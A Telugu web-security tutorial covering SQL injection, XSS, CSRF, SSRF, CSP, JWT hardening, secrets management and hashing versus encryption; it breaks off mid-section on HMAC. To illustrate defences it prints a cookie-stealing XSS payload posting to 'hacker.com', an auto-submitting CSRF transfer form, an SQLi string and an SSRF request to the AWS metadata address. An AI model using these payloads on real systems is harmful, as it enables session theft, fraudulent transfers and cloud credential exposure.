const query = `SELECT * FROM users WHERE username = ? AND password = ?`;

db.execute(query, [req.body.username, req.body.password]);
```

**ఇది ఎందుకు సేఫ్?**
ఇప్పుడు హ్యాకర్ `admin' OR '1'='1` అని పంపినా, డేటాబేస్ దాన్ని ఒక కమాండ్ లా కాకుండా, కేవలం ఒక పెద్ద యూజర్‌నేమ్ టెక్స్ట్ లాగా మాత్రమే చూస్తుంది. ఆ పేరుతో ఏ యూజర్ ఉండడు కాబట్టి ఎటాక్ ఫెయిల్ అవుతుంది.

---

## 🛡️ SQL Injection ని ఎలా ప్రివెంట్ చేయాలి? (Best Practices)

1. **Never Trust User Input:** యూజర్ దగ్గర నుండి వచ్చే ఏ డేటాని (Forms, Query Params, Headers) బ్లైండ్ గా నమ్మకూడదు.
2. **Use ORM / Query Builders:** Node.js లో `Sequelize`, `Prisma`, లేదా `TypeORM` లాంటి టూల్స్ వాడితే, అవి బై-డిఫాల్ట్ క్వెరీలను పారామీటరైజ్ చేస్తాయి, కాబట్టి SQLi వచ్చే ఛాన్స్ చాలా వరకు తగ్గుతుంది.
3. **Input Validation:** ఇన్‌పుట్ కేవలం అక్షరాలా, నంబర్లా అనేది ముందే వాలిడేట్ చేయాలి (ఉదా: `express-validator` किंवा `Joi` లైబ్రరీస్ వాడటం).
4. **Principle of Least Privilege:** మీ అప్లికేషన్ వాడే డేటాబేస్ యూజర్ అకౌంట్‌కి కేవలం కావలసినంత (Read/Write) పర్మిషన్స్ మాత్రమే ఇవ్వాలి. అడ్మిన్ (Root) పర్మిషన్స్ ఇవ్వకూడదు.

---

సెక్యూరిటీ (Security) మరియు OWASP Top 10 ప్రపంచంలో **SQL Injection** తర్వాత వెబ్ అప్లికేషన్లను అత్యంత ఎక్కువగా వేధించే రెండు ప్రసిద్ధ ఫ్రంటెండ్/బ్యాకెండ్ దాడులు ఇవి.

ఈ రెండూ బ్రౌజర్ మరియు కుకీల (Cookies) చుట్టూనే తిరుగుతాయి, కానీ వీటి పనితీరు పూర్తిగా భిన్నంగా ఉంటుంది. వీటిని కూడా మన స్టైల్‌లో ప్రాక్టికల్ కోడ్ మరియు రియల్-వరల్డ్ సినారియోలతో తెలుగులో క్లియర్‌గా నేర్చుకుందాం.

---

## 1. XSS (Cross-Site Scripting - హానికరమైన కోడ్‌ని ఇంజెక్ట్ చేయడం)

- **The Core Concept:** హ్యాకర్ ఒక వెబ్‌సైట్‌ లోపలికి మాలీషియస్ (హానికరమైన) **JavaScript కోడ్‌ని ఇంజెక్ట్ చేస్తాడు**. ఆ వెబ్‌సైట్‌ను చూసే ఇతర అమాయక యూజర్ల బ్రౌజర్‌లలో ఈ కోడ్ ఆటోమేటిక్‌గా రన్ అయిపోతుంది.
- **The Damage:** జావాస్క్రిప్ట్ బ్రౌజర్‌లో రన్ అయిందంటే... హ్యాకర్ మీ `localStorage` లేదా `sessionStorage` లో దాచుకున్న సెషన్ టోకెన్స్ (JWT), కుకీలను దొంగిలించి మీ అకౌంట్‌ను హ్యాక్ చేయగలడు.

### 📌 XSS రకాలు & ఉదాహరణ:

1. **Stored XSS (Most Dangerous):** హ్యాకర్ ఒక కామెంట్ బాక్స్‌లో తన పేరుకు బదులు `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>` అని రాసి సబ్‌మిట్ చేస్తాడు. ఇది డేటాబేస్‌లో సేవ్ అయిపోతుంది. ఇప్పుడు ఆ పేజీని ఓపెన్ చేసిన ప్రతి ఒక్క యూజర్ బ్రౌజర్‌లో ఆ స్క్రిప్ట్ రన్ అయి, వారి కుకీలు హ్యాకర్‌కి వెళ్ళిపోతాయి.
2. **Reflected XSS:** ఇది యుఆర్ఎల్ (URL) ద్వారా వస్తుంది. `http://example.com/search?q=<script>alert('Hacked')</script>`. ఈ లింక్‌ని యూజర్ క్లిక్ చేయగానే బ్రౌజర్‌లో స్క్రిప్ట్ రన్ అవుతుంది.

### 🛡️ XSS ని ఎలా ప్రివెంట్ చేయాలి?

- **Data Sanitization & Contextual Encoding:** యూజర్ ఇచ్చే ఇన్‌పుట్ లోని HTML ట్యాగ్‌లను క్లీన్ చేయాలి (ఉదా: `<` ని `&lt;` గా మార్చడం). Node.js లో దీనికోసం **`dompurify`** లేదా **`sanitize-html`** లాంటి లైబ్రరీలు వాడాలి.
- **HTTP-Only Cookies:** మీ అథెంటికేషన్ టోకెన్స్ (JWT) ని లోకల్ స్టోరేజ్‌లో దాచకూడదు! వాటిని **`httpOnly: true`** కుకీలలో దాచాలి. ఇలా చేయడం వల్ల బ్రౌజర్‌లోని ఏ జావాస్క్రిప్ట్ కోడ్ కూడా ఆ కుకీని చదవలేదు (`document.cookie` కొట్టినా ఖాళీగా వస్తుంది).
- **Content Security Policy (CSP):** మీ బ్రౌజర్‌లో ఏయే వెబ్‌సైట్ల నుండి స్క్రిప్ట్‌లు లోడ్ అవ్వాలో ముందే డిఫైన్ చేసే HTTP హెడర్ ఇది.

---

## 2. CSRF (Cross-Site Request Forgery - యూజర్ ప్రమేయం లేకుండా యాక్షన్ చేయడం)

- **The Core Concept:** ఇక్కడ హ్యాకర్ మీ వెబ్‌సైట్ లోకి ఎలాంటి కోడ్‌ని ఇంజెక్ట్ చేయడు. బదులుగా, మీరు ఆల్రెడీ ఒక వెబ్‌సైట్ (ఉదా: మీ బ్యాంక్ సైట్) లో లాగిన్ అయి ఉన్నారనే నమ్మకంతో... బ్రౌజర్ యొక్క డిఫాల్ట్ బిహేవియర్ (ఆటోమేటిక్‌గా కుకీలను పంపడం) ని వాడుకుని **మీ ప్రమేయం లేకుండా ఒక దొంగ రిక్వెస్ట్‌ని పంపిస్తాడు**.
- **The Analogy:** మీరు ఒక ఆఫీస్ కి వెళ్లి సంతకం పెట్టి లాగిన్ అయ్యారు. మీ టేబుల్ పై ఒక అప్లికేషన్ ఫామ్ ఉంది. మీరు వాష్‌రూమ్‌కి వెళ్ళినప్పుడు, ఎవరో వచ్చి మీ బ్యాంక్ అకౌంట్ నుండి డబ్బులు బదిలీ చేసే ఫామ్ ని అక్కడ పెట్టారు. ఆఫీస్ బాయ్ మీ సంతకాన్ని చూసి దాన్ని నిజమైన రిక్వెస్ట్ అనుకుని ప్రాసెస్ చేసేశాడు. ఇక్కడ బాయ్ బ్రౌజర్ లాంటివాడు, ఆ ఫామ్ CSRF లాంటిది.

### 📌 CSRF ఎలా జరుగుతుంది?

1. మీరు `bank.com` లో లాగిన్ అయ్యారు. బ్రౌజర్‌లో మీ సెషన్ కుకీ సేవ్ అయి ఉంది.
2. మీరు పొరపాటున హ్యాకర్ పంపిన `free-gifts.com` అనే ఒక నకిలీ వెబ్‌సైట్‌ను ఓపెన్ చేశారు.
3. ఆ సైట్ లోపల బ్యాక్‌గ్రౌండ్‌లో ఒక హిడెన్ ఫామ్ ఉంటుంది:

````html
<form action="http://bank.com/api/transfer" method="POST">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="to_account" value="hacker_id" />
</form>
<script>
  document.forms[0].submit();
</script>
```
````

4. బ్రౌజర్ నియమం ప్రకారం, `bank.com` కి రిక్వెస్ట్ వెళ్తున్నప్పుడు మీ లాగిన్ కుకీని కూడా ఆటోమేటిక్‌గా ఆ రిక్వెస్ట్‌తో పాటు పంపేస్తుంది. బ్యాంక్ సర్వర్ "ఓహో! కుకీ ఉంది కాబట్టి ఇది యూజరే పంపాడు" అనుకుని డబ్బులు ట్రాన్స్ఫర్ చేసేస్తుంది.

### 🛡️ CSRF ని ఎలా ప్రివెంట్ చేయాలి?

- **Anti-CSRF Tokens (CSRF Tokens):** ఇది అత్యంత సురక్షితమైన పద్ధతి. యూజర్ ఫామ్ ఓపెన్ చేసినప్పుడు బ్యాకెండ్ ఒక రాండమ్, సీక్రెట్ టోకెన్‌ను జనరేట్ చేసి ఫ్రంటెండ్‌కి ఇస్తుంది. ఫ్రంటెండ్ ప్రతి `POST/PUT` రిక్వెస్ట్ లోనూ ఆ టోకెన్‌ను పంపాలి. హ్యాకర్‌కి ఈ ఇంటర్నల్ టోకెన్ తెలియదు కాబట్టి, కేవలం కుకీ ఉన్నా సరే రిక్వెస్ట్ ఫెయిల్ అవుతుంది. Node.js లో దీనికోసం **`csurf`** లాంటి మిడిల్‌వేర్ వాడతాం.
- **SameSite Cookie Attribute:** మీ కుకీలకి **`SameSite=Strict`** లేదా **`SameSite=Lax`** అని సెట్ చేయాలి. ఇలా చేయడం వల్ల థర్డ్-పార్టీ వెబ్‌సైట్ల (హ్యాకర్ సైట్) నుండి వచ్చే రిక్వెస్ట్‌లతో పాటు మీ కుకీలు సర్వర్‌కి వెళ్ళవు.

---

## 📌 క్విక్ సమ్మరీ (రెండు ముక్కల్లో తేడా):

- **XSS:** మీ వెబ్‌సైట్ లోపలికి హ్యాకర్ దొంగ కోడ్‌ని పంపి, మీ బ్రౌజర్‌లోని **డేటాని (Cookies/Tokens) దొంగిలిస్తాడు**. (Target: Browser/Data).
- **CSRF:** హ్యాకర్ మీ డేటాని దొంగిలించలేడు, కానీ మీ బ్రౌజర్‌లో ఆల్రెడీ ఉన్న కుకీలను వాడుకుని మీ అకౌంట్ ద్వారా **ఒక దొంగ పనిని (Action) చేపిస్తాడు**. (Target: Server/Action).

---

సెక్యూరిటీ (Security) మరియు OWASP Top 10 సిరీస్‌లో మనం ఇప్పటివరకు క్లయింట్-సైడ్ మరియు డేటాబేస్ ఎటాక్స్ చూశాం. ఇప్పుడు మనం నేర్చుకోబోయే **SSRF** అనేది బ్యాకెండ్ సర్వర్‌ని టార్గెట్ చేసే అత్యంత ప్రమాదకరమైన దాడి, మరియు **CSP** అనేది XSS లాంటి దాడులను అడ్డుకోవడానికి బ్రౌజర్‌లో మనం పెట్టే ఒక స్ట్రాంగ్ సెక్యూరిటీ లేయర్.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. SSRF (Server-Side Request Forgery - సర్వర్‌ని దొంగలా మార్చడం)

- **The Core Concept:** CSRF లో హ్యాకర్ యూజర్ బ్రౌజర్‌ని వాడుకుని బ్యాంక్ సర్వర్‌కి రిక్వెస్ట్ పంపిస్తాడు. కానీ **SSRF** లో హ్యాకర్ మీ **బ్యాకెండ్ సర్వర్‌ని వాడుకుని, దానికి మాత్రమే యాక్సెస్ ఉన్న ఇంటర్నల్ నెట్‌వర్క్ లేదా థర్డ్-పార్టీ సైట్లపై దాడులు చేయిస్తాడు**.
- **The Analogy:** ఒక కంపెనీ ఆఫీస్ లోపల ఒక ప్రైవేట్ లాకర్ ఉంది. సెక్యూరిటీ గార్డ్ బయటి వాళ్ళని ఎవరినీ లోపలికి రానివ్వడు, కానీ ఆఫీస్ మేనేజర్ చెప్తే వింటాడు. ఇప్పుడు హ్యాకర్ మేనేజర్‌కి ఒక లెటర్ రాసి, "ఆ లాకర్ లోపల ఏముందో ఫోటో తీసి నాకు పంపు" అని అడిగాడు. మేనేజర్ బ్లైండ్‌గా గార్డ్ దగ్గరికి వెళ్లి ఆ పని చేశాడు. ఇక్కడ మేనేజరే మీ బ్యాకెండ్ సర్వర్, ఆ లెటరే SSRF దాడి.

### 📌 SSRF ఎలా జరుగుతుంది? (కోడ్ లెవెల్ లో)

మీ వెబ్‌సైట్‌లో యూజర్లు తమ ప్రొఫైల్ పిక్చర్‌ని ఏదైనా యుఆర్ఎల్ (URL) ద్వారా అప్‌లోడ్ చేసే ఫీచర్ ఉందనుకుందాం. బ్యాకెండ్‌లో కోడ్ ఇలా రాశారు:

```javascript
// ❌ అభద్రతా కోడ్ (Vulnerable Code)
app.post("/upload-avatar", async (req, res) => {
  const imageUrl = req.body.url; // హ్యాకర్ ఇచ్చే URL
  const response = await axios.get(imageUrl); // సర్వర్ ఆ URL కి రిక్వెస్ట్ పంపుతుంది
  res.send(response.data);
});
```

**ఇక్కడ హ్యాకర్ ఏం చేస్తాడు?**
సాధారణ యూజర్ `http://images.com/my-pic.jpg` అని ఇస్తాడు. కానీ హ్యాకర్ చాకచక్యంగా మీ ఇంటర్నల్ నెట్‌వర్క్ లేదా AWS సర్వర్ మెటాడేటా యుఆర్ఎల్‌ని పంపుతాడు:
`http://169.254.169.254/latest/meta-data/` (ఇది AWS లో మీ సర్వర్ యొక్క సీక్రెట్ కీస్, ఐఏఎం రోల్స్ దాగి ఉండే ప్రైవేట్ ఐపీ).

మీ సర్వర్ లోపల ఉంది కాబట్టి, అది బ్లైండ్‌గా ఆ ఐపీకి కనెక్ట్ అయి, మీ క్లౌడ్ సీక్రెట్స్ అన్నింటినీ లాక్కుని హ్యాకర్‌కి రెస్పాన్స్ రూపంలో ఇచ్చేస్తుంది!

### 🛡️ SSRF ని ఎలా ప్రివెంట్ చేయాలి?

1. **IP Whitelisting / Blacklisting:** యూజర్ పంపే URL లో `127.0.0.1`, `localhost`, లేదా ప్రైవేట్ క్లౌడ్ ఐపీలు (`169.254.*`, `10.*`, `192.168.*`) ఉంటే ఆ రిక్వెస్ట్‌ని సర్వర్ లోపలే బ్లాక్ చేయాలి.
2. **URL Validation:** కేవలం `http://` లేదా `https://` మాత్రమే అనుమతించాలి. `file://` లేదా `gopher://` లాంటి ప్రోటోకాల్స్ వాడితే సర్వర్ లోపలి ఫైల్స్ లీక్ అవుతాయి.
3. **Isolated Network:** మీ బ్యాకెండ్ సర్వర్‌కి ఇంటర్నల్ ప్రైవేట్ రిసోర్సెస్ (డేటాబేస్, మెటాడేటా) యాక్సెస్ ఉండాలి కానీ, అది బయటి నుండి వచ్చే ఏ యుఆర్ఎల్‌కైనా బ్లైండ్‌గా రిక్వెస్ట్ పంపకుండా నెట్‌వర్క్ లెవెల్ లో ఫైర్‌వాల్ రూల్స్ పెట్టాలి.

---

## 2. CSP (Content Security Policy - బ్రౌజర్ రక్షణ కవచం)

- **The Core Concept:** మనం XSS (Cross-Site Scripting) చాప్టర్ లో చూశాం కదా—హ్యాకర్లు దొంగ స్క్రిప్ట్‌లని మన సైట్ లో రన్ చేయడానికి ట్రై చేస్తారని. ఆ XSS దాడులను పూర్తిగా తుడిచిపెట్టడానికి మోడర్న్ బ్రౌజర్లు అందించే ఒక అత్యంత పవర్‌ఫుల్ అస్త్రమే **CSP**.
- **What it is:** ఇది మీ బ్యాకెండ్ సర్వర్ నుండి బ్రౌజర్‌కి పంపే ఒక **HTTP Response Header (`Content-Security-Policy`)**. మీ వెబ్‌సైట్ లోపల ఏయే సోర్సెస్ (Domains) నుండి స్క్రిప్ట్‌లు, ఇమేజ్‌లు, లేదా స్టైల్స్ లోడ్ అవ్వవచ్చో బ్రౌజర్‌కి ఇచ్చే ఒక పక్కా వైట్‌లిస్ట్ (Whitelist) రూల్స్ బుక్ ఇది.

### 📌 CSP హెడర్ ఉదాహరణ:

మీ బ్యాకెండ్ నుండి బ్రౌజర్‌కి ఈ హెడర్ వెళ్ళింది అనుకుందాం:

```text
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com;

```

**ఈ రూల్స్ కి అర్థం ఏంటి?**

1. `default-src 'self'`: బై-డిఫాల్ట్ అన్ని ఫైల్స్ (Images, CSS, Fonts) కేవలం మా సొంత డొమైన్ (`'self'`) నుండి మాత్రమే లోడ్ అవ్వాలి.
2. `script-src 'self' https://apis.google.com`: జావాస్క్రిప్ట్ కోడ్ కేవలం మా సైట్ నుండి లేదా గూగుల్ ఏపీఐ సైట్ నుండి మాత్రమే రన్ అవ్వాలి.

**హ్యాకర్ దొరికిపోతాడు:**
ఇప్పుడు ఒకవేళ హ్యాకర్ మీ సైట్ లోకి ఒక Stored XSS స్క్రిప్ట్ ఇంజెక్ట్ చేసి, దాన్ని రన్ చేయడానికి ట్రై చేసినా... బ్రౌజర్ వెంటనే ఈ CSP రూల్స్ చెక్ చేస్తుంది. ఆ స్క్రిప్ట్ గూగుల్ లేదా మీ సొంత సైట్ నుండి రాలేదు కాబట్టి, బ్రౌజర్ దాన్ని **బ్లాక్ చేస్తుంది** మరియు ఎర్రర్ చూపిస్తుంది.

### 🛡️ CSP బెస్ట్ ప్రాక్టీసెస్:

- **No `unsafe-inline`:** మీ HTML ఫైల్ లోపల నేరుగా `<script>alert('hi')</script>` అని రాయకూడదు. అన్ని స్క్రిప్ట్‌లు విడిగా `.js` ఫైల్స్ లోనే ఉండాలి.
- **Report-URI:** మీ సైట్ లో ఎవరైనా CSP రూల్స్ బ్రేక్ చేయడానికి (హ్యాక్ చేయడానికి) ట్రై చేస్తే, ఆ సమాచారాన్ని మీ బ్యాకెండ్‌కి పంపడానికి `report-uri /csp-violation` అని సెట్ చేసుకోవచ్చు.

---

### 📌 క్విక్ సమ్మరీ:

- **SSRF (Server எటాక్):** హ్యాకర్ మీ బ్యాకెండ్ సర్వర్‌ని బలిపశువును చేసి, లోపల ఉన్న ప్రైవేట్ డేటాని/కీలని దొంగిలిస్తాడు.
- **CSP (Browser రక్షణ):** బ్యాకెండ్ ఇచ్చే రూల్స్ హెడర్, బ్రౌజర్ లోపల దొంగ స్క్రిప్ట్‌లు (XSS) రన్ అవ్వకుండా అడ్డుకుంటుంది.

---

సాఫ్ట్‌వేర్ ఆర్కిటెక్చర్‌లో అథెంటికేషన్ (Authentication) మరియు సెక్యూరిటీని డిజైన్ చేసేటప్పుడు... **JWT (JSON Web Token)** లని ఎలా సెక్యూర్ చేయాలి మరియు అప్లికేషన్ రహస్యాలను (**Secrets Management**) ఎలా దాచాలి అనేది ప్రతి సీనియర్ డెవలపర్ కచ్చితంగా తెలుసుకోవాల్సిన మోస్ట్ ఇంపార్టెంట్ టాపిక్స్.

కోడ్‌లో చిన్న తప్పు జరిగినా మొత్తం యూజర్ డేటా హ్యాకర్ల చేతికి వెళ్ళిపోతుంది. వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, ప్రాక్టికల్ గైడ్‌లైన్స్‌తో తెలుగులో నేర్చుకుందాం.

---

## 1. JWT Security (టోకెన్ల రక్షణ వలయం)

JWT అనేది **Stateless Authentication** కి బెస్ట్ టూల్. అంటే సర్వర్ లోపల సెషన్స్ దాచకుండా, టోకెన్ లోపలే యూజర్ డేటాని ప్యాక్ చేసి పంపుతాం. కానీ JWT వాడేటప్పుడు చాలా మంది చేసే కొన్ని బ్లిండర్ తప్పులు, వాటిని ఆపే పద్ధతులు ఇవే:

### ❌ 1. టోకెన్ లోపల సీక్రెట్ డేటా దాచడం (Never Put Sensitive Data)

- **The Myth:** చాలా మంది JWT టోకెన్ ఎన్‌క్రిప్ట్ అయి ఉంటుంది అనుకుంటారు.
- **The Reality:** JWT కేవలం **Base64Encoded** మాత్రమే అవుతుంది తప్ప ఎన్‌క్రిప్ట్ (Encrypted) అవ్వదు. ఎవరైనా సరే ఆ టోకెన్‌ను తీసుకెళ్లి `jwt.io` సైట్‌లో పెడితే లోపల ఉన్న డేటా మొత్తం క్లియర్ టెక్స్ట్‌గా కనిపిస్తుంది.
- **Fix:** టోకెన్ పేలోడ్ (Payload) లోపల పాస్‌వర్డ్‌లు, క్రెడిట్ కార్డ్ వివరాలు, లేదా పర్సనల్ ఐడీలు పెట్టకూడదు. కేవలం `userId` లేదా `role` లాంటి నాన్-సెన్సిటివ్ డేటా మాత్రమే ఉంచాలి.

### 🛡️ 2. కుకీస్ వర్సెస్ లోకల్ స్టోరేజ్ (Where to Store?)

- **Local Storage (Dangerous):** టోకెన్‌ను `localStorage` లో దాచితే, మీ యాప్‌పై ఒక్క **XSS (Cross-Site Scripting)** దాడి జరిగినా, హ్యాకర్ జావాస్క్రిప్ట్ ద్వారా టోకెన్‌ను దొంగిలించగలడు.
- **HttpOnly Cookies (Secure):** JWT ని ఎల్లప్పుడూ **`httpOnly: true`**, **`secure: true`**, మరియు **`SameSite=Lax/Strict`** కుకీలలోనే దాచాలి. దీనివల్ల బ్రౌజర్‌లోని ఏ జావాస్క్రిప్ట్ కూడా టోకెన్‌ను చదవలేదు (XSS నుండి 100% రక్షణ).

### ⏳ 3. షార్ట్-లైవ్డ్ టోకెన్స్ & రోటేషన్ (Short Expiry & Refresh Tokens)

- **The Danger:** ఒకవేళ మీ `Access Token` హ్యాకర్ చేతికి దొరికితే, దానికి ఎక్స్‌పైరీ డేట్ లేకపోతే హ్యాకర్ మీ అకౌంట్‌ను ఎప్పటికీ వాడుకోగలడు.
- **The Fix (Dual Token System):**
- **Access Token:** దీనికి కేవలం **15 నిమిషాల** ఎక్స్‌పైరీ మాత్రమే ఇవ్వాలి. ఇది బ్రౌజర్ కుకీలో ఉంటుంది.
- **Refresh Token:** దీనికి **7 రోజులు** ఎక్స్‌పైరీ ఇవ్వవచ్చు. ఇది డేటాబేస్ లో సేవ్ అయి ఉంటుంది. యాక్సెస్ టోకెన్ అయిపోగానే బ్యాక్‌గ్రౌండ్‌లో రిఫ్రెష్ టోకెన్ ద్వారా కొత్త యాక్సెస్ టోకెన్ తెచ్చుకుంటాం. ఒకవేళ యూజర్ ఫోన్ పోయినా లేదా హ్యాక్ అయినా, డేటాబేస్ లో రిఫ్రెష్ టోకెన్ డిలీట్ చేస్తే హ్యాకర్ ఆటోమేటిక్‌గా లాగ్ అవుట్ అయిపోతాడు.

### 🔑 4. బలమైన అల్గారిథమ్స్ (Algorithm Selection)

- **None Algorithm Attack:** పాత JWT లైబ్రరీలలో హెడర్ లో `alg: "none"` అని పంపితే టోకెన్ వెరిఫికేషన్ స్కిప్ అయ్యేది. ఎల్లప్పుడూ మీ కోడ్‌లో ఖచ్చితంగా `jwt.verify(token, SECRET, { algorithms: ['HS256'] })` అని అల్గారిథమ్‌ని ఫోర్స్ చేయాలి.
- **RS256 vs HS256:** పెద్ద మైక్రోసర్వీసెస్ సిస్టమ్స్ లో **RS256 (Asymmetric - Public/Private Key)** వాడటం బెస్ట్. మీ అథెంటికేషన్ సర్వర్ ప్రైవేట్ కీతో టోకెన్ సైన్ చేస్తుంది, మిగతా మైక్రోసర్వీసెస్ కేవలం పబ్లిక్ కీతో దాన్ని వెరిఫై చేసుకుంటాయి. దీనివల్ల సీక్రెట్ కీ లీక్ అయ్యే ఛాన్స్ ఉండదు.

---

## 2. Secrets Management (రహస్యాల నిర్వహణ)

సాఫ్ట్‌వేర్ డెవలప్‌మెంట్‌లో డేటాబేస్ పాస్‌వర్డ్‌లు, ఏపీఐ కీలు (Stripe, Twilio keys), మరియు JWT సీక్రెట్ కీలను ఎలా హ్యాండిల్ చేయాలి అని చెప్పే కాన్సెప్ట్ ఇది.

### ❌ ద బ్యాడ్ ప్రాక్టీస్ (The Hardcoding Sin)

కోడ్ లోపల నేరుగా `const DB_PASS = "my_secret_pass_123"` అని రాయడం లేదా `.env` ఫైల్‌ని పొరపాటున GitHub లోకి పుష్ చేయడం అత్యంత ప్రమాదకరమైన తప్పు. రోబోలు గిట్‌హబ్‌ని నిరంతరం స్కాన్ చేస్తూ ఇలాంటి కీలు దొరకగానే అకౌంట్లను హ్యాక్ చేస్తుంటాయి.

### 🛡️ ద బెస్ట్ ప్రాక్టీస్ (Production-Ready Secrets Management)

1. **Environment Variables (.env):** లోకల్ డెవలప్‌మెంట్‌లో కీలను `.env` ఫైల్‌లో ఉంచి, ఆ ఫైల్‌ని కచ్చితంగా `.gitignore` లో యాడ్ చేయాలి. కోడ్‌లో `process.env.DB_PASS` ద్వారా వాడుకోవాలి.
2. **Cloud Secrets Managers (Production):** మీ అప్లికేషన్ ప్రొడక్షన్‌లోకి (AWS/Azure/GCP) వెళ్లాక, రహస్యాలన్నింటినీ క్లౌడ్ మేనేజ్డ్ సర్వీసెస్ లో దాచాలి:

- **AWS Secrets Manager / Parameter Store:** మీ కోడ్ రన్ అవుతున్నప్పుడు క్లౌడ్ SDK ద్వారా ఈ సర్వీస్ నుండి పాస్‌వర్డ్‌ని మెమరీలోకి తెచ్చుకుంటుంది.
- **HashiCorp Vault:** ఇది ఇండస్ట్రీలో మోస్ట్ పాపులర్ ఓపెన్ సోర్స్/ఎంటర్‌ప్రైజ్ సీక్రెట్ మేనేజ్మెంట్ టూల్.

3. **Dynamic Secret Rotation:** ప్రొడక్షన్‌లో కీలను ప్రతి 30 లేదా 90 రోజులకు ఒకసారి ఆటోమేటిక్‌గా మార్చేలా (**Rotate**) సెట్ చేయాలి. దీనివల్ల ఒకవేళ పాత పాస్‌వర్డ్ ఎవరికైనా తెలిసినా, అది ఆల్రెడీ మారిపోతుంది కాబట్టి సిస్టమ్ సేఫ్ గా ఉంటుంది.

---

### 📌 క్విక్ సమ్మరీ:

- **JWT:** టోకెన్ ని `HttpOnly` కుకీలో దాచు, ఎక్స్‌పైరీ టైమ్ తక్కువ పెట్టు (`15m`), రిఫ్రెష్ టోకెన్ ఆర్కిటెక్చర్ వాడు.
- **Secrets:** కోడ్‌లో కీలను హార్డ్‌కోడ్ చేయకు, ప్రొడక్షన్‌లో `AWS Secrets Manager` లేదా `HashiCorp Vault` లాంటి డెడికేటెڈ టూల్స్ మాత్రమే వాడు.

---

సెక్యూరిటీ (Security) మరియు క్రిప్టోగ్రఫీ ప్రపంచంలో డేటాని దాచడానికి మరియు అది నిజమైనదేనా కాదా అని వెరిఫై చేయడానికి వాడే మూడు అత్యంత ప్రాథమిక మరియు ముఖ్యమైన పిల్లర్స్ ఇవి. చాలా మంది డెవలపర్లు ఎన్‌క్రిప్షన్ కి, హ్యాషింగ్ కి కన్ఫ్యూజ్ అవుతుంటారు.

ఈ మూడింటి మధ్య ఉన్న స్పష్టమైన తేడాలను, వాటి రియల్-వరల్డ్ యూజ్ కేసెస్‌ని మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Hashing (వన్-వే ప్రయాణం - One Way)

- **The Core Concept:** హ్యాషింగ్ అనేది **వన్-వే (One-Way) ఫంక్షన్**. అంటే మీరు ఒక టెక్స్ట్‌ని హ్యాష్‌గా మార్చగలరు కానీ, ఆ హ్యాష్‌ని మళ్ళీ వెనక్కి తిప్పి ఒరిజినల్ టెక్స్ట్‌ని రప్పించడం అసాధ్యం. ఇన్‌పుట్ ఎంత పెద్దదైనా (ఒక ముక్క లేదా ఒక పెద్ద బుక్), వచ్చే అవుట్‌పుట్ (Hash) మాత్రం ఎప్పుడూ ఒకే స్థిరమైన సైజ్ (Fixed Length) లో ఉంటుంది.
- **Property (Deterministic):** ఇన్‌పుట్‌లో ఒక చిన్న డాట్ లేదా అక్షరం మార్చినా, వచ్చే హ్యాష్ పూర్తిగా మారిపోతుంది (**Avalanche Effect**). కానీ ఒకే ఇన్‌పుట్‌కి ఎప్పుడూ ఒకే హ్యాష్ వస్తుంది.
- **Algorithms:** SHA-256, bcrypt, Argon2, scrypt (పాతవైన MD5, SHA-1 లని ఇప్పుడు వాడకూడదు).
- **When to use:** **యూజర్ పాస్‌వర్డ్‌లను డేటాబేస్‌లో దాచడానికి.** \* _Flow:_ యూజర్ సైన్-అప్ అయినప్పుడు పాస్‌వర్డ్ `password123` ని `bcrypt` తో హ్యాష్ చేసి డేటాబేస్ లో దాచుకుంటాం. హ్యాకర్ డేటాబేస్ దొంగిలించినా వాడికి పాస్‌వర్డ్ ఏంటో తెలియదు. యూజర్ మళ్ళీ లాగిన్ అయినప్పుడు, వచ్చిన పాస్‌వర్డ్‌ని మళ్ళీ హ్యాష్ చేసి, డేటాబేస్ లోని హ్యాష్‌తో మ్యాచ్ అయిందో లేదో మాత్రమే సిస్టమ్ వెరిఫై చేస్తుంది.

---

## 2. Encryption (టూ-వే ప్రయాణం - Two Way)

- **The Core Concept:** ఎన్‌క్రిప్షన్ అనేది **టూ-వే (Two-Way) ప్రయాణం**. అంటే ఒక సీక్రెట్ కీ (Key/తాళం) ని వాడి ప్లెయిన్ టెక్స్ట్‌ని ఎవరికీ అర్థం కాని కోడ్ (`Ciphertext`) లాగా మార్చవచ్చు, మళ్ళీ అదే కీని వాడి దాన్ని వెనక్కి తిప్పి ఒరిజినల్ డేటాని చదవవచ్చు (**Decryption**).
- **Types of Encryption:**

1. **Symmetric Encryption (ఒకే తాళం):** డేటాని లాక్ చేయడానికి (Encrypt), అన్‌లాక్ చేయడానికి (Decrypt) ఒకే ఒక్క సీక్రెట్ కీని వాడుతాం. ఇది చాలా ఫాస్ట్ గా ఉంటుంది.

- _Algorithms:_ **AES-256** (ఇండస్ట్రీ స్టాండర్డ్).

2. **Asymmetric Encryption (రెండు తాళాలు):** ఇక్కడ రెండు కీలు ఉంటాయి—**Public Key** (అందరికీ తెలిసేది) మరియు **Private Key** (మీ దగ్గరే రహస్యంగా ఉండేది). పబ్లిక్ కీతో లాక్ చేసిన డేటాని కేవలం దానికి సంబంధించిన ప్రైవేట్ కీతో మాత్రమే అన్‌లాక్ చేయగలం.

- _Algorithms:_ **RSA**, ECC.

- **When to use:** నెట్‌వర్క్‌లో ప్రయాణించే డేటా (Data in Transit - HTTPS/TLS) లేదా డేటాబేస్ లో దాచే సెన్సిటివ్ ఫైల్స్, క్రెడిట్ కార్డ్ నంబర్ల (Data at Rest) భద్రత కోసం. ఎందుకంటే ఈ డేటాని అప్లికేషన్ మళ్ళీ చదవాల్సి ఉంటుంది.

---

## 3. HMAC (Hash-based Message Authentication Code - సంతకం)

- **The Core Concept:** హ్యాషింగ్ కి ఒక **సీక్రెట్ కీ (Secret Key)** ని జత చేస్తే వచ్చేదే HMAC. ఇది కేవలం డేటాని దాచడానికి కాదు, **"నెట్‌వర్క్‌లో వచ్చిన డేటా నిజంగానే మనకు నమ్మకమైన వ్యక్తి పంపాడా, లేదా మధ్యలో ఎవరైనా మార్చేశారా" (Data Integrity & Authentication)** అని వెరిఫై చేయడానికి వాడే ఒక డిజిటల్ సంతకం (Signature) లాంటిది.
- **How it works:** `HMAC = Hash(Message + Secret Key)`
